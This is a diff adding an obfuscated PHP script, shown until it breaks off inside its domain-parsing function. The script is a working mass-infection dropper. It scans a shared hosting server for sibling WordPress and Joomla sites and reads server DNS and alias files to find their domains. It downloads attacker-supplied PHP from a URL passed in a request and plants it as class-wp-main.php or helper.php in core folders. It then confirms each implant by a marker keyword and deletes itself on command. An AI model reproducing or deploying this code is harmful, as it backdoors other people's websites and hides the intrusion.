@@ -1,0 +1,710 @@
+<?php error_reporting (0);
+
+set_time_limit  (0);
+ini_set (base64_decode('bWF4X2V4ZWN1dGlvbl90aW1l'), 100000);
+
+
+
+if (array_key_exists (base64_decode('ZGVsZXRl'), $_REQUEST))
+{
+  unlink(__FILE__);
+  die;
+}
+
+$byq3e334e859879af25 = get_wordpress_main_content ();
+$snpe4774cdda0793f86    = get_joomla_main_content    ();
+
+$qqg2d387ab98437e5f5    = getcwd ();
+$gkp7ed21b04c0dcde1c         = remove_www (get_domain ($_SERVER[base64_decode('SFRUUF9IT1NU')]));
+
+$xgv8ed54f04419ffb30 = remove_tld ($gkp7ed21b04c0dcde1c);
+
+$gak72baa9d520b127dd         = strpos ($qqg2d387ab98437e5f5, $gkp7ed21b04c0dcde1c);
+$nlea6a03a321dfc9ab8 = strpos ($qqg2d387ab98437e5f5, $xgv8ed54f04419ffb30);
+
+if ($gak72baa9d520b127dd !== false)
+{
+  echo "&#10003; Matched domain name ($gkp7ed21b04c0dcde1c) with path: " . $qqg2d387ab98437e5f5 . base64_decode('PGJyPg==');
+  $ogod93f987d2e126d9a = get_domains_dir ($qqg2d387ab98437e5f5, $gak72baa9d520b127dd);
+  
+  if (!is_readable($ogod93f987d2e126d9a))
+  {
+    echo base64_decode('JiMxMDAwNzsgVW5hYmxlIHRvIHJlYWQgZGlyZWN0b3J5OiA=') . $ogod93f987d2e126d9a . base64_decode('PGJyPg==');
+    process ($gkp7ed21b04c0dcde1c, estimate_current_path());
+    check_config ();
+    die;
+  }
+    
+  foreach (get_valid_dirs ($ogod93f987d2e126d9a) as $mvp3a876e157f4f77fe)
+  {
+    $gkp7ed21b04c0dcde1c = clean_domain ($mvp3a876e157f4f77fe);
+
+    $mvp3a876e157f4f77fe = $ogod93f987d2e126d9a . base64_decode('Lw==') . $gkp7ed21b04c0dcde1c;
+
+    if (is_domain ($gkp7ed21b04c0dcde1c) && !is_dir_empty($mvp3a876e157f4f77fe))
+    {
+      process ($gkp7ed21b04c0dcde1c, $mvp3a876e157f4f77fe);
+    }
+  }
+}
+elseif ($nlea6a03a321dfc9ab8 !== false)
+{
+  echo "&#10003; Matched partial domain ($xgv8ed54f04419ffb30) name with path: " . $qqg2d387ab98437e5f5 . base64_decode('PGJyPg==');
+  $ogod93f987d2e126d9a = get_domains_dir ($qqg2d387ab98437e5f5, $nlea6a03a321dfc9ab8);
+  
+  if (!is_readable($ogod93f987d2e126d9a))
+  {
+    echo base64_decode('JiMxMDAwNzsgVW5hYmxlIHRvIHJlYWQgZGlyZWN0b3J5OiA=') . $ogod93f987d2e126d9a . base64_decode('PGJyPg==');
+    process ($gkp7ed21b04c0dcde1c, estimate_current_path());
+    check_config ();
+    die;
+  }
+  
+  $wqd37cc8552b35560a7 = get_user_domains ();
+  
+  if ($wqd37cc8552b35560a7)
+  {
+    echo base64_decode('JiMxMDAwMzsgUmVhZGluZyBmcm9tIGNvbmZpZyBmaWxlczxicj4=');
+
+    foreach (get_valid_dirs ($ogod93f987d2e126d9a) as $mvp3a876e157f4f77fe)
+    {
+      $gkp7ed21b04c0dcde1c = clean_domain ($mvp3a876e157f4f77fe);
+    
+      $hqa4124bc0a9335c27f = in_array_partial ($gkp7ed21b04c0dcde1c, $wqd37cc8552b35560a7);
+      
+      $mvp3a876e157f4f77fe = $ogod93f987d2e126d9a . base64_decode('Lw==') . $gkp7ed21b04c0dcde1c;
+
+      if ($hqa4124bc0a9335c27f !== false && !is_dir_empty($mvp3a876e157f4f77fe))
+      {
+        process ($wqd37cc8552b35560a7[$hqa4124bc0a9335c27f], $mvp3a876e157f4f77fe);
+      }
+    }
+  }
+  else
+  {
+    echo base64_decode('JiMxMDAwMzsgTWF0Y2hpbmcgcGFydGlhbCB0bGRzPGJyPg==');
+
+    $wqd37cc8552b35560a7 = get_valid_dirs ($ogod93f987d2e126d9a);
+    
+    if (empty ($wqd37cc8552b35560a7))
+    {
+      echo base64_decode('Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7IE5vIGRvbWFpbnMgd2VyZSBmb3VuZC48YnI+');
+      check_config();
+      die;
+    }
+    
+    foreach ($wqd37cc8552b35560a7 as $mvp3a876e157f4f77fe)
+    {
+      $gkp7ed21b04c0dcde1c = clean_domain ($mvp3a876e157f4f77fe);
+      
+      $erb774f344a61569260 = is_domain_partial ($gkp7ed21b04c0dcde1c);
+
+      $mvp3a876e157f4f77fe = $ogod93f987d2e126d9a . base64_decode('Lw==') . $gkp7ed21b04c0dcde1c;
+      
+      if ($erb774f344a61569260 && !is_dir_empty($mvp3a876e157f4f77fe))
+      {
+        process ($erb774f344a61569260, $mvp3a876e157f4f77fe);
+      }
+    }    
+  }
+}
+else
+{
+  echo base64_decode('JiMxMDAwNzsgV2Fzbid0IGFibGUgdG8gbWF0Y2ggZG9tYWluIG5hbWUuPGJyPg==');
+
+  $ogod93f987d2e126d9a = estimate_current_path();
+
+  process ($gkp7ed21b04c0dcde1c, $ogod93f987d2e126d9a);
+
+  foreach (get_valid_dirs ($ogod93f987d2e126d9a) as $mvp3a876e157f4f77fe)
+  {
+    $gkp7ed21b04c0dcde1c = clean_domain ($mvp3a876e157f4f77fe);
+
+    $mvp3a876e157f4f77fe = $ogod93f987d2e126d9a . base64_decode('Lw==') . $gkp7ed21b04c0dcde1c;
+
+    if (is_domain ($gkp7ed21b04c0dcde1c) && !is_dir_empty($mvp3a876e157f4f77fe))
+    {
+      process ($gkp7ed21b04c0dcde1c, $mvp3a876e157f4f77fe);
+    }
+  }
+
+  check_config ();
+}
+
+
+function check_config ()
+{
+  echo base64_decode('PGJyPkNoZWNraW5nIGNvbmZpZ3MuLi48YnI+');
+  $wqd37cc8552b35560a7 = get_user_domains ();
+  $gqze2075474294983e0 = get_current_user_name ();
+  
+  if ($wqd37cc8552b35560a7)
+  {
+    echo base64_decode('JiMxMDAwMzsgUmVhZGluZyBmcm9tIGNvbmZpZyBmaWxlczxicj4=');
+    echo base64_decode('JiMxMDAwMzsgRm91bmQ6IA==') . sizeof($wqd37cc8552b35560a7) . " domains for current user: $gqze2075474294983e0<br>";
+    foreach ($wqd37cc8552b35560a7 as $gkp7ed21b04c0dcde1c)
+    {
+      echo "&nbsp;&nbsp;&nbsp;&nbsp;-> domain: $gkp7ed21b04c0dcde1c<br>";
+    }
+  }
+  else
+  {
+    echo base64_decode('JiMxMDAwNzsgVW5hYmxlIHRvIHJlYWQgY29uZmlnIGZpbGVzPGJyPg==');
+  }
+}
+
+function is_dir_empty ($mvp3a876e157f4f77fe)
+{
+  if (!is_readable ($mvp3a876e157f4f77fe))
+  {
+    return NULL; 
+  }
+
+  return (count (scandir ($mvp3a876e157f4f77fe)) == 2);
+}
+
+function in_array_partial ($xgv8ed54f04419ffb30, $wqd37cc8552b35560a7)
+{
+  $dpxd6cbb48444bf8cf4 = 0;
+
+  foreach ($wqd37cc8552b35560a7 as $gkp7ed21b04c0dcde1c)
+  {
+    $zvbff1ccf57e98c817d = remove_tld ($gkp7ed21b04c0dcde1c);
+    
+    if ($zvbff1ccf57e98c817d == $xgv8ed54f04419ffb30)
+    {
+      return $dpxd6cbb48444bf8cf4;
+    }
+    
+    $dpxd6cbb48444bf8cf4++;
+  }
+  
+  return false;
+}
+
+function bool_to_string ($ibzc9f9d7dd806cf412)
+{
+  return $ibzc9f9d7dd806cf412 ? base64_decode('dHJ1ZQ=='): base64_decode('ZmFsc2U=');
+}
+
+function process ($gkp7ed21b04c0dcde1c, $mvp3a876e157f4f77fe)
+{
+  $buke324ad8ed03e3a7b = bool_to_string (is_readable ($mvp3a876e157f4f77fe));
+  $kqie1cdbda92a8167c8 = bool_to_string (is_writable ($mvp3a876e157f4f77fe));
+
+  echo "&nbsp;&nbsp;&nbsp;&nbsp;-> domain: $gkp7ed21b04c0dcde1c | path: $mvp3a876e157f4f77fe | readable: $buke324ad8ed03e3a7b | writable: $kqie1cdbda92a8167c8";
+  
+  list ($zij2919b6b3d414956e, $lsxf4fc7371dbc6aba6) = is_cms ($mvp3a876e157f4f77fe);
+
+  if ($zij2919b6b3d414956e)
+  {
+    echo " | is $lsxf4fc7371dbc6aba6 (path: $zij2919b6b3d414956e)";
+
+    $noj5337eaaabe97ff33 = null;
+
+    switch ($lsxf4fc7371dbc6aba6)
+    {
+      case base64_decode('d29yZHByZXNz'):
+        $noj5337eaaabe97ff33 = inject_wordpress_main_php ($zij2919b6b3d414956e);
+        break;
+      case base64_decode('am9vbWxh'):
+        $noj5337eaaabe97ff33 = inject_joomla_main_php ($zij2919b6b3d414956e);
+        break;
+    }
+
+        if (!$noj5337eaaabe97ff33)
+    {
+      echo base64_decode('PGJyPg==');
+      return;
+    }
+
+    $zdb816104fe23f930b8 = assert_main_php ($gkp7ed21b04c0dcde1c, $noj5337eaaabe97ff33, $mvp3a876e157f4f77fe);
+
+    if ($noj5337eaaabe97ff33)
+    {
+      if ($zdb816104fe23f930b8)
+      {
+        echo " | main.php: $noj5337eaaabe97ff33 (direct link: $zdb816104fe23f930b8)";
+      }
+      else
+      {
+        echo " | main.php: $noj5337eaaabe97ff33";
+      }
+    }
+  }
+
+  echo base64_decode('PGJyPg==');
+}
+
+
+
+function is_cms ($mvp3a876e157f4f77fe)
+{
+  $jftd7b24e66a3c4ea77 = is_joomla ($mvp3a876e157f4f77fe);
+  if ($jftd7b24e66a3c4ea77)
+  {
+    return array($jftd7b24e66a3c4ea77, base64_decode('am9vbWxh'));
+  }
+
+  $xqa7376df083061151b = is_wordpress ($mvp3a876e157f4f77fe);
+  if ($xqa7376df083061151b)
+  {
+    return array($xqa7376df083061151b, base64_decode('d29yZHByZXNz'));
+  }
+}
+
+function get_search_keyword ()
+{
+  if (array_key_exists (base64_decode('a2V5d29yZA=='), $_REQUEST))
+  {
+    return $_REQUEST[base64_decode('a2V5d29yZA==')];
+  }
+  else
+  {
+    return base64_decode('dHRtYWludHQ=');
+  }
+}
+
+function assert_main_php ($gkp7ed21b04c0dcde1c, $noj5337eaaabe97ff33, $mvp3a876e157f4f77fe)
+{
+  $cxi7c030bc903e6dce0     = explode       (base64_decode('Lw=='), $noj5337eaaabe97ff33);
+  $cxi7c030bc903e6dce0     = array_reverse ($cxi7c030bc903e6dce0);
+
+  $gdw919d250e02683667 = false;
+
+  foreach ($cxi7c030bc903e6dce0 as $izr0459f1e5dc998dc9)
+  {
+    if ($gdw919d250e02683667)
+    {
+      $gdw919d250e02683667 = base64_decode('Lw==') . $izr0459f1e5dc998dc9 . base64_decode('Lw==') . $gdw919d250e02683667;
+    }
+    else
+    {
+      $gdw919d250e02683667 = base64_decode('Lw==') . $izr0459f1e5dc998dc9;
+    }
+
+    $elk2c900c2d089965db = $gkp7ed21b04c0dcde1c . $gdw919d250e02683667;
+    $elk2c900c2d089965db = str_replace (base64_decode('Ly8='), base64_decode('Lw=='), $elk2c900c2d089965db);
+    $elk2c900c2d089965db = base64_decode('aHR0cDovLw==') . $elk2c900c2d089965db;
+
+    $xpiaa94a0c90561686d = url_get_contents ($elk2c900c2d089965db);
+
+    if ($xpiaa94a0c90561686d !== false && strpos (strtolower ($xpiaa94a0c90561686d), strtolower (get_search_keyword ())) !== false)
+    {
+      return base64_decode('aHR0cDovLw==') . $gkp7ed21b04c0dcde1c . $gdw919d250e02683667;
+    }
+  }
+  
+  return false;
+}
+
+function get_wordpress_main_content ()
+{
+  return get_main_content (base64_decode('bWFpbg=='));
+}
+
+function get_joomla_main_content ()
+{
+  return get_main_content (base64_decode('am9vbV9tYWlu'));
+}
+
+function get_main_content($eaic7ac83d076e8731b)
+{
+  $adw84407071aa237e07 = false;
+
+  if (array_key_exists ($eaic7ac83d076e8731b, $_REQUEST))
+  {
+    try
+    {
+      $adw84407071aa237e07 = url_get_contents ($_REQUEST[$eaic7ac83d076e8731b]);
+      if ($adw84407071aa237e07 === false)
+      {
+        echo "&#10007; Unable to read $eaic7ac83d076e8731b.php from: " . $_REQUEST[$eaic7ac83d076e8731b] . base64_decode('PGJyPg==');
+      }
+      else
+      {
+        echo "&#10003; Downloaded $eaic7ac83d076e8731b.php from " . $_REQUEST[$eaic7ac83d076e8731b] . base64_decode('PGJyPg==');
+      }
+    }
+    catch (Exception $phrd64a4fb21aa78ce4)
+    {
+      $adw84407071aa237e07 = false;
+      echo "&#10007; Unable to read $eaic7ac83d076e8731b.php from: " . $_REQUEST[$eaic7ac83d076e8731b] . base64_decode('PGJyPg==');
+    }
+  }
+
+  return $adw84407071aa237e07;
+}
+
+function inject_wordpress_main_php ($xqa7376df083061151b)
+{
+  global $byq3e334e859879af25;
+
+  $fsh8286e09aa759584d = base64_decode('Y2xhc3Mtd3AtbWFpbi5waHA=');
+  $pphc47cf6b1c7dfcb72             = array(base64_decode('L3dwLWFkbWluLw=='), base64_decode('L3dwLWNvbnRlbnQv'), base64_decode('L3dwLWluY2x1ZGVzLw=='), base64_decode('Lw=='));
+  return inject_main_php ($xqa7376df083061151b, $fsh8286e09aa759584d, $pphc47cf6b1c7dfcb72, $byq3e334e859879af25);
+}
+
+function inject_joomla_main_php ($jftd7b24e66a3c4ea77)
+{
+  global $snpe4774cdda0793f86;
+
+  $fsh8286e09aa759584d = base64_decode('aGVscGVyLnBocA==');
+  $pphc47cf6b1c7dfcb72             = array(base64_decode('L2NvbXBvbmVudHMvY29tX2NvbnRlbnQv'), base64_decode('L2FkbWluaXN0cmF0b3Iv'), base64_decode('Lw=='));
+    return inject_main_php ($jftd7b24e66a3c4ea77, $fsh8286e09aa759584d, $pphc47cf6b1c7dfcb72, $snpe4774cdda0793f86);
+}
+
+function inject_main_php ($zij2919b6b3d414956e, $fsh8286e09aa759584d, $pphc47cf6b1c7dfcb72, $adw84407071aa237e07)
+{
+  if ($adw84407071aa237e07 == false)
+  {
+    return false;
+  }
+
+  $jyg4dabfc91400e263d = false;
+
+  foreach ($pphc47cf6b1c7dfcb72 as $mvp3a876e157f4f77fe)
+  {
+    if (is_writable ($zij2919b6b3d414956e . $mvp3a876e157f4f77fe))
+    {
+      $jyg4dabfc91400e263d = $zij2919b6b3d414956e . $mvp3a876e157f4f77fe . $fsh8286e09aa759584d;
+      break;
+    }
+  }
+  
+  if ($jyg4dabfc91400e263d === false)
+  {
+    return false;
+  }
+  
+  file_put_contents ($jyg4dabfc91400e263d, $adw84407071aa237e07);
+  
+  if (file_exists ($jyg4dabfc91400e263d))
+  {
+    return $jyg4dabfc91400e263d;
+  }
+  else
+  {
+    return false;
+  }
+}
+
+function get_current_user_name ()
+{
+  $gqze2075474294983e0 = posix_getpwuid(posix_geteuid());
+
+  return $gqze2075474294983e0[base64_decode('bmFtZQ==')];
+}
+
+function get_user_domains ()
+{
+  $gqze2075474294983e0 = posix_getpwuid(posix_geteuid());
+  $tfo9128523da3369445 = array();
+
+  if (is_readable (base64_decode('L3Zhci9uYW1lZA==')))
+  {
+    $vyhe5a2b2628c670cff = scandir (base64_decode('L3Zhci9uYW1lZA=='));
+
+    foreach($vyhe5a2b2628c670cff as $gkp7ed21b04c0dcde1c)
+    {
+      if (strpos ($gkp7ed21b04c0dcde1c, base64_decode('LmRi')))
+      {
+      	$gkp7ed21b04c0dcde1c = str_replace (base64_decode('LmRi'), '', $gkp7ed21b04c0dcde1c);
+        $alz758215d106c39f7a = fileowner (base64_decode('L2V0Yy92YWxpYXNlcy8=') . $gkp7ed21b04c0dcde1c);
+        if ($alz758215d106c39f7a !== FALSE)
+        {
+          $ruo480ddcae2e46248f = posix_getpwuid ($alz758215d106c39f7a);
+          if ($ruo480ddcae2e46248f[base64_decode('bmFtZQ==')] == $gqze2075474294983e0[base64_decode('bmFtZQ==')])
+          {
+            $tfo9128523da3369445[] = $gkp7ed21b04c0dcde1c;
+          }
+        }
+      }
+    }
+    
+    return $tfo9128523da3369445;
+  }
+  else
+  {
+    return false;
+  }
+}
+
+function remove_tld ($gkp7ed21b04c0dcde1c)
+{
+  $cxi7c030bc903e6dce0 = explode (base64_decode('Lg=='), $gkp7ed21b04c0dcde1c, 2);
+  
+  return $cxi7c030bc903e6dce0[0];
+}
+
+function is_wordpress ($brk2f93fac7cbdf7b79)
+{
+  $pphc47cf6b1c7dfcb72 = get_dirs_recursive ($brk2f93fac7cbdf7b79);
+
+  foreach ($pphc47cf6b1c7dfcb72 as $mvp3a876e157f4f77fe)
+  {
+    if (file_exists ($mvp3a876e157f4f77fe . base64_decode('L3dwLWNvbmZpZy5waHA=')) && file_exists ($mvp3a876e157f4f77fe . base64_decode('L3dwLWFkbWluLw==')) && file_exists ($mvp3a876e157f4f77fe . base64_decode('L3dwLWluY2x1ZGVzLw==')))
+    {
+      return $mvp3a876e157f4f77fe;
+    }
+  }
+
+  return false;
+}
+
+function is_joomla ($brk2f93fac7cbdf7b79)
+{
+  $pphc47cf6b1c7dfcb72 = get_dirs_recursive ($brk2f93fac7cbdf7b79);
+  
+  foreach ($pphc47cf6b1c7dfcb72 as $mvp3a876e157f4f77fe)
+  {
+    if (file_exists ($mvp3a876e157f4f77fe . base64_decode('L2NvbmZpZ3VyYXRpb24ucGhw')) && file_exists ($mvp3a876e157f4f77fe . base64_decode('L2NvbXBvbmVudHMvY29tX2NvbnRlbnQv')) && file_exists ($mvp3a876e157f4f77fe . base64_decode('L2FkbWluaXN0cmF0b3IvY29tcG9uZW50cy8=')))
+    {
+      return $mvp3a876e157f4f77fe;
+    }
+  }
+
+  return false;
+}
+
+function get_dirs_recursive ($mvp3a876e157f4f77fe)
+{
+  if (class_exists(base64_decode('UmVjdXJzaXZlSXRlcmF0b3JJdGVyYXRvcg==')) && class_exists(base64_decode('UmVjdXJzaXZlRGlyZWN0b3J5SXRlcmF0b3I=')) && defined(base64_decode('UmVjdXJzaXZlRGlyZWN0b3J5SXRlcmF0b3I6OlNLSVBfRE9UUw==')))
+  {
+    $kpr34050badc48ab4c5 = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($mvp3a876e157f4f77fe, RecursiveDirectoryIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::SELF_FIRST,
+        RecursiveIteratorIterator::CATCH_GET_CHILD
+    );
+    
+    $iftef843f083f1cee12 = array($mvp3a876e157f4f77fe);
+
+    foreach ($kpr34050badc48ab4c5 as $brk2f93fac7cbdf7b79 => $mvp3a876e157f4f77fe)
+    {
+      if ($mvp3a876e157f4f77fe->isDir())
+      {
+        $iftef843f083f1cee12[] = $brk2f93fac7cbdf7b79;
+      }
+    }
+    
+    return $iftef843f083f1cee12;
+  }
+  else
+  {
+        return array($mvp3a876e157f4f77fe);
+  }
+}
+
+function get_domains_dir ($mvp3a876e157f4f77fe, $cbn7099289b25e5441f)
+{
+  $mvp3a876e157f4f77fe = substr ($mvp3a876e157f4f77fe, 0, $cbn7099289b25e5441f);
+  return substr ($mvp3a876e157f4f77fe, 0, strrpos ($mvp3a876e157f4f77fe, base64_decode('Lw==')));
+}
+
+function get_valid_dirs ($mvp3a876e157f4f77fe)
+{
+  $pphc47cf6b1c7dfcb72 = get_dirs ($mvp3a876e157f4f77fe);
+  return array_filter ($pphc47cf6b1c7dfcb72, base64_decode('Y291bGRfYmVfZG9tYWlu'));
+}
+
+function could_be_domain ($mvp3a876e157f4f77fe)
+{
+  $mvp3a876e157f4f77fe = clean_domain ($mvp3a876e157f4f77fe);
+  return strlen ($mvp3a876e157f4f77fe) > 6 && !in_array ($mvp3a876e157f4f77fe, get_common_dirs());
+}
+
+function get_dirs ($mvp3a876e157f4f77fe)
+{
+  $mvp3a876e157f4f77fe = rtrim ($mvp3a876e157f4f77fe, base64_decode('Lw=='));
+  return array_filter(glob($mvp3a876e157f4f77fe . base64_decode('Lyo=')), base64_decode('aXNfZGly'));
+}
+
+function have_tld ($gkp7ed21b04c0dcde1c)
+{
+  $cxi7c030bc903e6dce0 = explode (base64_decode('Lg=='), $gkp7ed21b04c0dcde1c, 2);
+  
+  return sizeof ($cxi7c030bc903e6dce0) > 1;
+}
+
+function is_domain ($gkp7ed21b04c0dcde1c)
+{
+  return filter_var (gethostbyname ($gkp7ed21b04c0dcde1c), FILTER_VALIDATE_IP);
+}
+
+function is_domain_partial ($xgv8ed54f04419ffb30)
+{
+  if (have_tld ($xgv8ed54f04419ffb30))
+  {
+    if (filter_var (gethostbyname ($xgv8ed54f04419ffb30), FILTER_VALIDATE_IP))
+    {
+      return $xgv8ed54f04419ffb30;
+    }
+    else
+    {
+      return false;
+    }
+  }
+  else
+  {
+    $acn50641838fba9970d = get_tlds();
+    
+    foreach ($acn50641838fba9970d as $abt1cd72b1b386d3fb7)
+    {
+      $yic8e16833d3f244c4e = filter_var (gethostbyname ($xgv8ed54f04419ffb30 . base64_decode('Lg==') . $abt1cd72b1b386d3fb7), FILTER_VALIDATE_IP);
+      
+      if ($yic8e16833d3f244c4e)
+      {
+        return $xgv8ed54f04419ffb30 . base64_decode('Lg==') . $abt1cd72b1b386d3fb7;
+      }
+    }
+    
+    return false;
+  }
+}
+
+function get_common_dirs()
+{
+  return array (
+    base64_decode('Y3Nz'), base64_decode('YmxvZw=='), base64_decode('c3RvcmU='), base64_decode('Y2dpLWJpbg=='), base64_decode('d3AtYWRtaW4='), base64_decode('d3AtY29udGVudA=='), base64_decode('dXBsb2Fkcw=='), base64_decode('aW5jbHVkZXM='), base64_decode('aHRtbA=='),
+    base64_decode('d3AtaW5jbHVkZXM=')
+  );
+}
+
+function get_tlds ()
+{
+  return array (
+    base64_decode('YWVybw=='), base64_decode('YXNpYQ=='), base64_decode('Yml6'), base64_decode('Y2F0'), base64_decode('Y29t'), base64_decode('Y29vcA=='), base64_decode('aW5mbw=='), base64_decode('aW50'), base64_decode('am9icw=='), base64_decode('bW9iaQ=='), base64_decode('bXVzZXVt'), base64_decode('bmFtZQ=='), base64_decode('bmV0'), base64_decode('b3Jn'), base64_decode('cG9zdA=='),
+    base64_decode('cHJv'), base64_decode('dGVs'), base64_decode('dHJhdmVs'), base64_decode('eHh4'), base64_decode('YWM='), base64_decode('YWQ='), base64_decode('YWU='), base64_decode('YWY='), base64_decode('YWc='), base64_decode('YWk='), base64_decode('YWw='), base64_decode('YW0='), base64_decode('YW4='), base64_decode('YW8='), base64_decode('YXE='), base64_decode('YXI='), base64_decode('YXM='), base64_decode('YXQ='),
+    base64_decode('YXU='), base64_decode('YXc='), base64_decode('YXg='), base64_decode('YXo='), base64_decode('YmE='), base64_decode('YmI='), base64_decode('YmQ='), base64_decode('YmU='), base64_decode('YmY='), base64_decode('Ymc='), base64_decode('Ymg='), base64_decode('Ymk='), base64_decode('Ymo='), base64_decode('Ymw='), base64_decode('Ym0='), base64_decode('Ym4='), base64_decode('Ym8='), base64_decode('YnE='), base64_decode('YnI='),
+    base64_decode('YnM='), base64_decode('YnQ='), base64_decode('YnY='), base64_decode('Ync='), base64_decode('Ynk='), base64_decode('Yno='), base64_decode('Y2E='), base64_decode('Y2M='), base64_decode('Y2Q='), base64_decode('Y2Y='), base64_decode('Y2c='), base64_decode('Y2g='), base64_decode('Y2k='), base64_decode('Y2s='), base64_decode('Y2w='), base64_decode('Y20='), base64_decode('Y24='), base64_decode('Y28='), base64_decode('Y3I='),
+    base64_decode('Y3U='), base64_decode('Y3Y='), base64_decode('Y3c='), base64_decode('Y3g='), base64_decode('Y3k='), base64_decode('Y3o='), base64_decode('ZGU='), base64_decode('ZGo='), base64_decode('ZGs='), base64_decode('ZG0='), base64_decode('ZG8='), base64_decode('ZHo='), base64_decode('ZWM='), base64_decode('ZWU='), base64_decode('ZWc='), base64_decode('ZWg='), base64_decode('ZXI='), base64_decode('ZXM='), base64_decode('ZXQ='),
+    base64_decode('ZXU='), base64_decode('Zmk='), base64_decode('Zmo='), base64_decode('Zms='), base64_decode('Zm0='), base64_decode('Zm8='), base64_decode('ZnI='), base64_decode('Z2E='), base64_decode('Z2I='), base64_decode('Z2Q='), base64_decode('Z2U='), base64_decode('Z2Y='), base64_decode('Z2c='), base64_decode('Z2g='), base64_decode('Z2k='), base64_decode('Z2w='), base64_decode('Z20='), base64_decode('Z24='), base64_decode('Z3A='),
+    base64_decode('Z3E='), base64_decode('Z3I='), base64_decode('Z3M='), base64_decode('Z3Q='), base64_decode('Z3U='), base64_decode('Z3c='), base64_decode('Z3k='), base64_decode('aGs='), base64_decode('aG0='), base64_decode('aG4='), base64_decode('aHI='), base64_decode('aHQ='), base64_decode('aHU='), base64_decode('aWQ='), base64_decode('aWU='), base64_decode('aWw='), base64_decode('aW0='), base64_decode('aW4='), base64_decode('aW8='),
+    base64_decode('aXE='), base64_decode('aXI='), base64_decode('aXM='), base64_decode('aXQ='), base64_decode('amU='), base64_decode('am0='), base64_decode('am8='), base64_decode('anA='), base64_decode('a2U='), base64_decode('a2c='), base64_decode('a2g='), base64_decode('a2k='), base64_decode('a20='), base64_decode('a24='), base64_decode('a3A='), base64_decode('a3I='), base64_decode('a3c='), base64_decode('a3k='), base64_decode('a3o='),
+    base64_decode('bGE='), base64_decode('bGI='), base64_decode('bGM='), base64_decode('bGk='), base64_decode('bGs='), base64_decode('bHI='), base64_decode('bHM='), base64_decode('bHQ='), base64_decode('bHU='), base64_decode('bHY='), base64_decode('bHk='), base64_decode('bWE='), base64_decode('bWM='), base64_decode('bWQ='), base64_decode('bWU='), base64_decode('bWY='), base64_decode('bWc='), base64_decode('bWg='), base64_decode('bWs='),
+    base64_decode('bWw='), base64_decode('bWxj'), base64_decode('bW0='), base64_decode('bW4='), base64_decode('bW8='), base64_decode('bXA='), base64_decode('bXE='), base64_decode('bXI='), base64_decode('bXM='), base64_decode('bXQ='), base64_decode('bXU='), base64_decode('bXY='), base64_decode('bXc='), base64_decode('bXg='), base64_decode('bXk='), base64_decode('bXo='), base64_decode('bmE='), base64_decode('bmM='), base64_decode('bmU='),
+    base64_decode('bmY='), base64_decode('bmc='), base64_decode('bmk='), base64_decode('bmw='), base64_decode('bm8='), base64_decode('bnA='), base64_decode('bnI='), base64_decode('bnU='), base64_decode('bno='), base64_decode('b20='), base64_decode('cGE='), base64_decode('cGU='), base64_decode('cGY='), base64_decode('cGc='), base64_decode('cGg='), base64_decode('cGs='), base64_decode('cGw='), base64_decode('cG0='), base64_decode('cG4='),
+    base64_decode('cHI='), base64_decode('cHM='), base64_decode('cHQ='), base64_decode('cHc='), base64_decode('cHk='), base64_decode('cWE='), base64_decode('cmU='), base64_decode('cm8='), base64_decode('cnM='), base64_decode('cnU='), base64_decode('cnc='), base64_decode('c2E='), base64_decode('c2I='), base64_decode('c2M='), base64_decode('c2Q='), base64_decode('c2U='), base64_decode('c2c='), base64_decode('c2g='), base64_decode('c2k='),
+    base64_decode('c2o='), base64_decode('c2s='), base64_decode('c2w='), base64_decode('c20='), base64_decode('c24='), base64_decode('c28='), base64_decode('c3I='), base64_decode('c3Q='), base64_decode('c3U='), base64_decode('c3Y='), base64_decode('c3g='), base64_decode('c3k='), base64_decode('c3o='), base64_decode('dGM='), base64_decode('dGQ='), base64_decode('dGY='), base64_decode('dGc='), base64_decode('dGg='), base64_decode('dGo='),
+    base64_decode('dGs='), base64_decode('dGw='), base64_decode('dG0='), base64_decode('dG4='), base64_decode('dG8='), base64_decode('dHA='), base64_decode('dHI='), base64_decode('dHQ='), base64_decode('dHY='), base64_decode('dHc='), base64_decode('dHo='), base64_decode('dWE='), base64_decode('dWc='), base64_decode('dWs='), base64_decode('dW0='), base64_decode('dXM='), base64_decode('dXk='), base64_decode('dXo='), base64_decode('dmE='),
+    base64_decode('dmM='), base64_decode('dmU='), base64_decode('dmc='), base64_decode('dmk='), base64_decode('dm4='), base64_decode('dnU='), base64_decode('d2Y='), base64_decode('d3M='), base64_decode('eWU='), base64_decode('eXQ='), base64_decode('emE='), base64_decode('em0='), base64_decode('enc=')
+  );
+}
+
+function clean_domain ($gkp7ed21b04c0dcde1c)
+{
+  return substr($gkp7ed21b04c0dcde1c, strrpos($gkp7ed21b04c0dcde1c, base64_decode('Lw==')) + 1);
+}
+
+function not_www ($foo62f0c4727a944780)
+{
+  return $foo62f0c4727a944780 !== base64_decode('d3d3');
+}
+
+function get_domain ($gkp7ed21b04c0dcde1c)
+{
+	$biq5caf10d1bf58b9de = $gkp7ed21b04c0dcde1c = strtolower($gkp7ed21b04c0dcde1c);
+	if (filter_var($gkp7ed21b04c0dcde1c, FILTER_VALIDATE_IP)) { return $gkp7ed21b04c0dcde1c; }
+	$tfxb00ea3d7900b7036 = array_slice(array_filter(explode(base64_decode('Lg=='), $gkp7ed21b04c0dcde1c, 4), base64_decode('bm90X3d3dw==')), 0); 	if (count($tfxb00ea3d7900b7036) > 2)
+	{
+		$hjuab715c8262983aba = count($tfxb00ea3d7900b7036);
+		$jgkd41af18a5acb8c8c = explode(base64_decode('Lg=='), $hjuab715c8262983aba === 4 ? $tfxb00ea3d7900b7036[3] : $tfxb00ea3d7900b7036[2]);
+		if (count($jgkd41af18a5acb8c8c) === 2) 		{
+			$wilb12b4282d32706d6 = array_shift($tfxb00ea3d7900b7036);
+			if ($hjuab715c8262983aba === 4) 			{
+				$wilb12b4282d32706d6 = array_shift($tfxb00ea3d7900b7036);
+			}
+		}
+		elseif (count($jgkd41af18a5acb8c8c) === 1) 		{
+			$wilb12b4282d32706d6 = array_shift($tfxb00ea3d7900b7036); 			if (strlen($jgkd41af18a5acb8c8c[0]) === 2 && $hjuab715c8262983aba === 3) 			{
+				array_unshift($tfxb00ea3d7900b7036, $wilb12b4282d32706d6);
+			}
+			else
+			{
+								$acn50641838fba9970d = array(
+					base64_decode('YWVybw=='),
+					base64_decode('YXJwYQ=='),
+					base64_decode('YXNpYQ=='),
+					base64_decode('Yml6'),
+					base64_decode('Y2F0'),
+					base64_decode('Y29t'),
+					base64_decode('Y29vcA=='),
+					base64_decode('ZWR1'),
